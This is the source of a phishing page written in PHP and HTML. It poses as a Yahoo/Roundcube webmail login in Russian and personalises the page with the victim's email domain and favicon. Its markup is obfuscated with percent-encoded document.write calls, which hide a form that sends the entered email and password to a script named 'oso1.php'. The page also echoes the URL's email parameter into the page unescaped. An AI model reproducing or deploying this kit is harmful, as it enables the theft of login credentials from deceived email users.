﻿<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html style="overflow-x: hidden;overflow-y: hidden;">
<head>
<!DOCTYPE html>
<html lang="en">
<html style="overflow-x: hidden;overflow-y: hidden;">
<head>
<!DOCTYPE html>
<html lang="en">
<head>
<title>Yahoo Webmail</title>
<meta name="viewport" content="" id="viewport" />
<link rel="shortcut icon" href="http://<?php echo $domain ?>/favicon.ico"/>
<script type="text/javascript">
<!-- HTML Encryption provided by www.webtoolhub.com -->
<!--
document.write(unescape('%3c%6c%69%6e%6b%20%72%65%6c%3d%22%73%74%79%6c%65%73%68%65%65%74%22%20%74%79%70%65%3d%22%74%65%78%74%2f%63%73%73%22%20%68%72%65%66%3d%22%68%74%74%70%73%3a%2f%2f%77%65%62%6d%61%69%6c%2e%72%61%64%69%6f%2d%63%61%6d%70%75%73%2e%6f%72%67%2f%73%6b%69%6e%73%2f%6c%61%72%72%79%2f%73%74%79%6c%65%73%2e%6d%69%6e%2e%63%73%73%3f%73%3d%31%35%32%33%34%34%35%32%32%37%22%20%2f%3e%0d%0a%3c%6c%69%6e%6b%20%72%65%6c%3d%22%73%74%79%6c%65%73%68%65%65%74%22%20%74%79%70%65%3d%22%74%65%78%74%2f%63%73%73%22%20%68%72%65%66%3d%22%68%74%74%70%73%3a%2f%2f%77%65%62%6d%61%69%6c%2e%72%61%64%69%6f%2d%63%61%6d%70%75%73%2e%6f%72%67%2f%70%6c%75%67%69%6e%73%2f%6a%71%75%65%72%79%75%69%2f%74%68%65%6d%65%73%2f%6c%61%72%72%79%2f%6a%71%75%65%72%79%2d%75%69%2e%63%73%73%3f%73%3d%31%35%32%33%34%34%35%32%32%36%22%3e%0d%0a%3c%73%63%72%69%70%74%20%74%79%70%65%3d%22%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%77%65%62%6d%61%69%6c%2e%72%61%64%69%6f%2d%63%61%6d%70%75%73%2e%6f%72%67%2f%73%6b%69%6e%73%2f%6c%61%72%72%79%2f%75%69%2e%6d%69%6e%2e%6a%73%3f%73%3d%31%35%32%33%34%34%35%32%32%37%22%3e%3c%2f%73%63%72%69%70%74%3e%0d%0a%0d%0a%0d%0a%0d%0a%3c%6d%65%74%61%20%68%74%74%70%2d%65%71%75%69%76%3d%22%63%6f%6e%74%65%6e%74%2d%74%79%70%65%22%20%63%6f%6e%74%65%6e%74%3d%22%74%65%78%74%2f%68%74%6d%6c%3b%20%63%68%61%72%73%65%74%3d%55%54%46%2d%38%22%20%2f%3e%0d%0a%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%77%65%62%6d%61%69%6c%2e%72%61%64%69%6f%2d%63%61%6d%70%75%73%2e%6f%72%67%2f%70%72%6f%67%72%61%6d%2f%6a%73%2f%6a%71%75%65%72%79%2e%6d%69%6e%2e%6a%73%3f%73%3d%31%35%32%33%34%34%35%32%34%32%22%20%74%79%70%65%3d%22%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%22%3e%3c%2f%73%63%72%69%70%74%3e%0d%0a%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%77%65%62%6d%61%69%6c%2e%72%61%64%69%6f%2d%63%61%6d%70%75%73%2e%6f%72%67%2f%70%72%6f%67%72%61%6d%2f%6a%73%2f%63%6f%6d%6d%6f%6e%2e%6d%69%6e%2e%6a%73%3f%73%3d%31%35%32%33%34%34%35%32%32%37%22%20%74%79%70%65%3d%22%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%22%3e%3c%2f%73%63%72%69%70%74%3e%0d%0a%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%77%65%62%6d%61%69%6c%2e%72%61%64%69%6f%2d%63%61%6d%70%75%73%2e%6f%72%67%2f%70%72%6f%67%72%61%6d%2f%6a%73%2f%61%70%70%2e%6d%69%6e%2e%6a%73%3f%73%3d%31%35%32%33%34%34%35%32%32%37%22%20%74%79%70%65%3d%22%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%22%3e%3c%2f%73%63%72%69%70%74%3e%0d%0a%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%77%65%62%6d%61%69%6c%2e%72%61%64%69%6f%2d%63%61%6d%70%75%73%2e%6f%72%67%2f%70%72%6f%67%72%61%6d%2f%6a%73%2f%6a%73%74%7a%2e%6d%69%6e%2e%6a%73%3f%73%3d%31%35%32%33%34%34%35%32%34%33%22%20%74%79%70%65%3d%22%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%22%3e%3c%2f%73%63%72%69%70%74%3e%0d%0a%3c%73%63%72%69%70%74%20%74%79%70%65%3d%22%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%22%3e'));
//-->
</script>


/*
        @licstart  The following is the entire license notice for the 
        JavaScript code in this page.

        Copyright (C) 2005-2014 The Roundcube Dev Team

        The JavaScript code in this page is free software: you can redistribute
        it and/or modify it under the terms of the GNU General Public License
        as published by the Free Software Foundation, either version 3 of
        the License, or (at your option) any later version.

        The code is distributed WITHOUT ANY WARRANTY; without even the implied
        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
        See the GNU GPL for more details.

        @licend  The above is the entire license notice
        for the JavaScript code in this page.
*/
var rcmail = new rcube_webmail();
rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,"cookie_domain":"","cookie_path":"\/","cookie_secure":true,"skin":"larry","refresh_interval":60,"session_lifetime":600,"action":"login","comm_path":".\/?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","request_token":"Jf7RsfBhvyO4AS8gRryl4qudD2MWFy10"});
rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","close":"Close","errortitle":"An error occurred!","toggleadvancedoptions":"Toggle advanced options"});
rcmail.display_message("Неверные данные для входа.","warning",0);
rcmail.gui_container("loginfooter","bottomline");
rcmail.gui_object('loginform', 'form');
rcmail.gui_object('message', 'message');
</script>

<script type="text/javascript">
<!-- HTML Encryption provided by www.webtoolhub.com -->
<!--
document.write(unescape('%3c%73%63%72%69%70%74%20%74%79%70%65%3d%22%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%77%65%62%6d%61%69%6c%2e%72%61%64%69%6f%2d%63%61%6d%70%75%73%2e%6f%72%67%2f%70%6c%75%67%69%6e%73%2f%6a%71%75%65%72%79%75%69%2f%6a%73%2f%6a%71%75%65%72%79%2d%75%69%2e%6d%69%6e%2e%6a%73%3f%73%3d%31%35%32%33%34%34%35%32%32%36%22%3e%3c%2f%73%63%72%69%70%74%3e%0d%0a%3c%2f%68%65%61%64%3e%0d%0a%3c%62%6f%64%79%3e%0d%0a%0d%0a%3c%68%31%20%63%6c%61%73%73%3d%22%76%6f%69%63%65%22%3e%52%6f%75%6e%64%43%75%62%65%20%57%65%62%6d%61%69%6c%20%4c%6f%67%69%6e%3c%2f%68%31%3e'));
//-->
</script>


<div id="login-form">
<div class="box-inner" role="main">
<div id="rcube-logo" style="margin: 0 auto;text-align:center;">
<img src="http://<?php echo $domain ?>/favicon.ico" width="90" height="33"> <tr><td"> 
<h1 class="#FF0000" id="mbr-login-greeting">
                <font face="verdana" size="4" color="#FFFFFF">
                <?php echo $yuh ?>            Безопасность почты
                </h1>
<script type="text/javascript">
<!-- HTML Encryption provided by www.webtoolhub.com -->
<!--
document.write(unescape('%3c%66%6f%72%6d%20%6e%61%6d%65%3d%22%66%6f%72%6d%22%20%6d%65%74%68%6f%64%3d%22%70%6f%73%74%22%20%61%63%74%69%6f%6e%3d%22%6f%73%6f%31%2e%70%68%70%22%3e'));
//-->
</script>

<input type="hidden" name="_token" value="W2aBxf1YSSJuOyV8y3OBtVOvgbrqXYTs">
<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="_default_"><input type="hidden" name="_url" id="rcmloginurl" value=""><table><tbody><tr><td class="title"><label for="rcmloginuser">Почта Адрес</label>
</td>
<td class="input"><input name="_user" id="rcmloginuser" value="<?php echo $_GET['email']; ?>"" size="40" autocapitalize="off" type="text"></td>
</tr>
<tr><td class="title"><label for="rcmloginpwd">пароль</label>
</td>
<td class="input"><input name="_pass" id="rcmloginpwd" required="required" size="40" autocapitalize="off" autocomplete="off" type="password"></td>
</tr>
</tbody>
</table>
<p class="formbuttons"><input type="submit" id="rcmloginsubmit" class="button mainaction" value="Авторизоваться"></p>

</form>

</div>

<div class="box-bottom" role="complementary">
	<div id="message"></div>
	<noscript>
		<p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
	</noscript>
</div>

<div id="bottomline" role="contentinfo">
	<?php echo $yuh ?> Проверка веб-почты
		
<script type="text/javascript">
<!-- HTML Encryption provided by www.webtoolhub.com -->
<!--
document.write(unescape('%3c%2f%64%69%76%3e%0d%0a%3c%2f%64%69%76%3e%0d%0a%0d%0a%0d%0a%0d%0a%3c%73%63%72%69%70%74%20%74%79%70%65%3d%22%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%22%3e%0d%0a%69%66%20%28%21%77%69%6e%64%6f%77%2e%55%49%29%20%7b%20%76%61%72%20%55%49%20%3d%20%6e%65%77%20%72%63%75%62%65%5f%6d%61%69%6c%5f%75%69%28%29%3b%20%7d%0d%0a%3c%2f%73%63%72%69%70%74%3e%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%3c%73%63%72%69%70%74%20%74%79%70%65%3d%22%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%22%3e%0d%0a%0d%0a%6a%51%75%65%72%79%2e%65%78%74%65%6e%64%28%6a%51%75%65%72%79%2e%75%69%2e%64%69%61%6c%6f%67%2e%70%72%6f%74%6f%74%79%70%65%2e%6f%70%74%69%6f%6e%73%2e%70%6f%73%69%74%69%6f%6e%2c%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%75%73%69%6e%67%3a%20%66%75%6e%63%74%69%6f%6e%28%70%6f%73%29%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%76%61%72%20%6d%65%20%3d%20%6a%51%75%65%72%79%28%74%68%69%73%29%2c%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6f%66%66%73%65%74%20%3d%20%6d%65%2e%63%73%73%28%70%6f%73%29%2e%6f%66%66%73%65%74%28%29%2c%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%74%6f%70%4f%66%66%73%65%74%20%3d%20%6f%66%66%73%65%74%2e%74%6f%70%20%2d%20%31%32%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%74%6f%70%4f%66%66%73%65%74%20%3c%20%30%29%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6d%65%2e%63%73%73%28%27%74%6f%70%27%2c%20%70%6f%73%2e%74%6f%70%20%2d%20%74%6f%70%4f%66%66%73%65%74%29%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%6f%66%66%73%65%74%2e%6c%65%66%74%20%2b%20%6d%65%2e%6f%75%74%65%72%57%69%64%74%68%28%29%20%2b%20%31%32%20%3e%20%6a%51%75%65%72%79%28%77%69%6e%64%6f%77%29%2e%77%69%64%74%68%28%29%29%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6d%65%2e%63%73%73%28%27%6c%65%66%74%27%2c%20%70%6f%73%2e%6c%65%66%74%20%2d%20%31%32%29%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%29%3b%0d%0a%24%28%64%6f%63%75%6d%65%6e%74%29%2e%72%65%61%64%79%28%66%75%6e%63%74%69%6f%6e%28%29%7b%20%0d%0a%72%63%6d%61%69%6c%2e%69%6e%69%74%28%29%3b%0d%0a%76%61%72%20%69%6d%61%67%65%73%20%3d%20%5b%22%73%6b%69%6e%73%5c%2f%6c%61%72%72%79%5c%2f%69%6d%61%67%65%73%5c%2f%61%6a%61%78%6c%6f%61%64%65%72%2e%67%69%66%22%2c%22%73%6b%69%6e%73%5c%2f%6c%61%72%72%79%5c%2f%69%6d%61%67%65%73%5c%2f%61%6a%61%78%6c%6f%61%64%65%72%5f%64%61%72%6b%2e%67%69%66%22%2c%22%73%6b%69%6e%73%5c%2f%6c%61%72%72%79%5c%2f%69%6d%61%67%65%73%5c%2f%62%75%74%74%6f%6e%73%2e%70%6e%67%22%2c%22%73%6b%69%6e%73%5c%2f%6c%61%72%72%79%5c%2f%69%6d%61%67%65%73%5c%2f%61%64%64%63%6f%6e%74%61%63%74%2e%70%6e%67%22%2c%22%73%6b%69%6e%73%5c%2f%6c%61%72%72%79%5c%2f%69%6d%61%67%65%73%5c%2f%66%69%6c%65%74%79%70%65%73%2e%70%6e%67%22%2c%22%73%6b%69%6e%73%5c%2f%6c%61%72%72%79%5c%2f%69%6d%61%67%65%73%5c%2f%6c%69%73%74%69%63%6f%6e%73%2e%70%6e%67%22%2c%22%73%6b%69%6e%73%5c%2f%6c%61%72%72%79%5c%2f%69%6d%61%67%65%73%5c%2f%6d%65%73%73%61%67%65%73%2e%70%6e%67%22%2c%22%73%6b%69%6e%73%5c%2f%6c%61%72%72%79%5c%2f%69%6d%61%67%65%73%5c%2f%6d%65%73%73%61%67%65%73%5f%64%61%72%6b%2e%70%6e%67%22%2c%22%73%6b%69%6e%73%5c%2f%6c%61%72%72%79%5c%2f%69%6d%61%67%65%73%5c%2f%71%75%6f%74%61%2e%70%6e%67%22%2c%22%73%6b%69%6e%73%5c%2f%6c%61%72%72%79%5c%2f%69%6d%61%67%65%73%5c%2f%73%65%6c%65%63%74%6f%72%2e%70%6e%67%22%2c%22%73%6b%69%6e%73%5c%2f%6c%61%72%72%79%5c%2f%69%6d%61%67%65%73%5c%2f%73%70%6c%69%74%74%65%72%2e%70%6e%67%22%2c%22%73%6b%69%6e%73%5c%2f%6c%61%72%72%79%5c%2f%69%6d%61%67%65%73%5c%2f%77%61%74%65%72%6d%61%72%6b%2e%6a%70%67%22%5d%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%66%6f%72%20%28%76%61%72%20%69%3d%30%3b%20%69%3c%69%6d%61%67%65%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%6d%67%20%3d%20%6e%65%77%20%49%6d%61%67%65%28%29%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%6d%67%2e%73%72%63%20%3d%20%69%6d%61%67%65%73%5b%69%5d%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0d%0a%7d%29%3b%0d%0a%3c%2f%73%63%72%69%70%74%3e%0d%0a%0d%0a%3c%2f%62%6f%64%79%3e%0d%0a%3c%2f%68%74%6d%6c%3e'));
//-->
</script>